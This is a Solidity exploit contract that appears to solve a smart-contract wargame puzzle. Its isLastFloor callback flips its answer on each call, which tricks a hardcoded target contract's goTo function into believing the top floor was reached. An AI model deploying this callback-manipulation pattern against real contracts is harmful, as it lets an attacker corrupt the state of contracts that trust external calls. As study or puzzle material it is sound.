// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Hack is Building {
    bool public a;
    event Log(bool);

    constructor() {
        a = true;
    }

    function isLastFloor(uint256) external override returns (bool) {
        a = !a;
        emit Log(a);
        return a;
    }

    function hack() public {
        emit Log(a);
        address addr = 0x985ab7E0663EbfF2E0F523f975D7D5A81bB9E42d;
        (bool success, ) = addr.call(abi.encodeWithSignature("goTo(uint256)", 2));
        if(!success) {
        }
        // require(success, "Call failed");
    }
}
